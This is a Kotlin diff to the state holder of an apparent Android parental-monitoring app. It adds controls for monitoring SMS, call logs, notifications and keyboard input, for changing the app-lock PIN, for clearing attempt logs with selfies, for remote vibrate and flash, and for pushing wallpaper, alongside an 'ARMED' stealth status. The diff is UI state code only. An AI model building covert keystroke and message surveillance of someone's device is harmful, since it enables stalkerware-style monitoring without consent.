@@ -1,6 +1,10 @@
 package com.nexus.parent.state
 
+import android.net.Uri
 import com.nexus.parent.data.DeviceStateCoordinator
+import com.nexus.parent.data.monitor.CombinedPattern
+import com.nexus.parent.data.monitor.FlashAction
+import com.nexus.parent.data.monitor.VibratePattern
 import com.nexus.parent.webrtc.VideoFeedType
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -317,11 +321,76 @@ class ParentStateHolder(
                 screen = ScreenFeedUiState(quality = state.settings.screenQuality),
                 mic = MicUiState(selectedVoice = state.settings.defaultVoicePreset),
                 location = LocationUiState(),
+                monitor = MonitorPanelsUiState(),
                 activeCallAlert = null,
                 stealthStatus = StealthStatus.ARMED,
                 reconnectAttempt = 0,
                 reconnectSecondsRemaining = 0,
                 toastMessage = toastMessage ?: state.toastMessage
+            )
+        }
+    }
+
+    fun updateMonitor(transform: (MonitorPanelsUiState) -> MonitorPanelsUiState) {
+        _uiState.update { state ->
+            state.copy(monitor = transform(state.monitor))
+        }
+    }
+
+    fun setMonitorFeatureState(
+        featureId: FeatureId,
+        nextState: MonitoringState,
+        isLiveBadge: Boolean
+    ) {
+        _uiState.update { state ->
+            val m = state.monitor
+            val nextMonitor = when (featureId) {
+                FeatureId.SMS -> m.copy(smsState = nextState)
+                FeatureId.CALLLOG -> m.copy(callLogState = nextState)
+                FeatureId.NOTIFICATION -> m.copy(notificationState = nextState)
+                FeatureId.KEYBOARD -> m.copy(keyboardState = nextState)
+                FeatureId.WELLBEING -> m.copy(wellbeing = m.wellbeing.copy(monitoringState = nextState))
+                FeatureId.APPLOCK -> m.copy(appLock = m.appLock.copy(monitoringState = nextState))
+                FeatureId.WALLPAPER -> m.copy(wallpaper = m.wallpaper.copy(monitoringState = nextState))
+                else -> m
+            }
+            val updatedLive = if (isLiveBadge) {
+                state.liveFeatures + featureId
+            } else {
+                state.liveFeatures - featureId
+            }
+            state.copy(monitor = nextMonitor, liveFeatures = updatedLive)
+        }
+    }
+
+    fun resetMonitorConnections() {
+        val monitorIds = setOf(
+            FeatureId.SMS,
+            FeatureId.CALLLOG,
+            FeatureId.NOTIFICATION,
+            FeatureId.KEYBOARD,
+            FeatureId.WELLBEING,
+            FeatureId.APPLOCK,
+            FeatureId.WALLPAPER
+        )
+        _uiState.update { state ->
+            val m = state.monitor
+            state.copy(
+                monitor = m.copy(
+                    smsState = MonitoringState.IDLE,
+                    callLogState = MonitoringState.IDLE,
+                    notificationState = MonitoringState.IDLE,
+                    keyboardState = MonitoringState.IDLE,
+                    wellbeing = m.wellbeing.copy(monitoringState = MonitoringState.IDLE),
+                    appLock = m.appLock.copy(monitoringState = MonitoringState.IDLE),
+                    wallpaper = m.wallpaper.copy(
+                        monitoringState = MonitoringState.IDLE,
+                        isFetching = false,
+                        isPushing = false,
+                        pushProgressPercent = 0
+                    )
+                ),
+                liveFeatures = state.liveFeatures - monitorIds
             )
         }
     }
@@ -645,6 +714,10 @@ class ParentStateHolder(
     // -------------------------------------------------------------------------
 
     fun toggleMonitorPanelPlayPause(featureId: FeatureId) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.toggleFeatureMonitoring(featureId)
+            return
+        }
         _uiState.update { state ->
             val m = state.monitor
             val (nextMonitor, isNowLive) = when (featureId) {
@@ -733,8 +806,20 @@ class ParentStateHolder(
     }
 
     fun setWellbeingRange(range: WellbeingRange) {
-        _uiState.update {
-            it.copy(monitor = it.monitor.copy(wellbeing = it.monitor.wellbeing.copy(range = range)))
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.selectWellbeingRange(range)
+        } else {
+            _uiState.update {
+                it.copy(monitor = it.monitor.copy(wellbeing = it.monitor.wellbeing.copy(range = range)))
+            }
+        }
+    }
+
+    fun refreshWellbeing() {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.refreshWellbeing()
+        } else {
+            showToast("Wellbeing refresh queued")
         }
     }
 
@@ -751,12 +836,16 @@ class ParentStateHolder(
     }
 
     fun toggleRemoteAppLock() {
-        _uiState.update { state ->
-            val next = !state.monitor.appLock.isLockEnabled
-            state.copy(
-                monitor = state.monitor.copy(appLock = state.monitor.appLock.copy(isLockEnabled = next)),
-                toastMessage = if (next) "App Lock enabled (UI Preview)" else "App Lock disabled (UI Preview)"
-            )
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.toggleRemoteAppLock()
+        } else {
+            _uiState.update { state ->
+                val next = !state.monitor.appLock.isLockEnabled
+                state.copy(
+                    monitor = state.monitor.copy(appLock = state.monitor.appLock.copy(isLockEnabled = next)),
+                    toastMessage = if (next) "App Lock enabled (UI Preview)" else "App Lock disabled (UI Preview)"
+                )
+            }
         }
     }
 
@@ -772,9 +861,55 @@ class ParentStateHolder(
         }
     }
 
+    fun confirmNewAppLockPin(pin: String) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.setRemoteAppLockPin(pin)
+        } else {
+            setChangePinDialogVisible(false)
+            showToast("6-digit PIN update queued")
+        }
+    }
+
+    fun clearAppLockRecords() {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.clearAppLockRecords()
+        } else {
+            _uiState.update {
+                it.copy(
+                    monitor = it.monitor.copy(appLock = it.monitor.appLock.copy(attempts = emptyList())),
+                    toastMessage = "App Lock attempt logs cleared"
+                )
+            }
+        }
+    }
+
     fun setSelfiePreviewAttempt(attempt: AppLockAttemptItem?) {
         _uiState.update {
             it.copy(monitor = it.monitor.copy(appLock = it.monitor.appLock.copy(previewingSelfieAttempt = attempt)))
+        }
+    }
+
+    fun triggerVibrate(pattern: VibratePattern) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.triggerVibrate(pattern)
+        } else {
+            triggerVibrateFlashAction("Vibration: ${pattern.displayLabel}")
+        }
+    }
+
+    fun triggerFlash(action: FlashAction) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.triggerFlash(action)
+        } else {
+            triggerVibrateFlashAction(action.displayLabel)
+        }
+    }
+
+    fun triggerCombined(pattern: CombinedPattern) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.triggerCombined(pattern)
+        } else {
+            triggerVibrateFlashAction("Combined ${pattern.displayLabel}")
         }
     }
 
@@ -799,13 +934,25 @@ class ParentStateHolder(
     }
 
     fun requestWallpaperPreview() {
-        _uiState.update {
-            it.copy(
-                monitor = it.monitor.copy(
-                    wallpaper = it.monitor.wallpaper.copy(hasPreviewLoaded = true, isFetching = false)
-                ),
-                toastMessage = "Wallpaper preview placeholder loaded"
-            )
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.fetchActiveWallpaper()
+        } else {
+            _uiState.update {
+                it.copy(
+                    monitor = it.monitor.copy(
+                        wallpaper = it.monitor.wallpaper.copy(hasPreviewLoaded = true, isFetching = false)
+                    ),
+                    toastMessage = "Wallpaper preview placeholder loaded"
+                )
+            }
+        }
+    }
+
+    fun pushWallpaperFromUri(uri: Uri) {
+        if (coordinator != null) {
+            coordinator.monitorCoordinator.pushWallpaperFromUri(uri)
+        } else {
+            showToast("Connect a child device to push wallpaper")
         }
     }
 
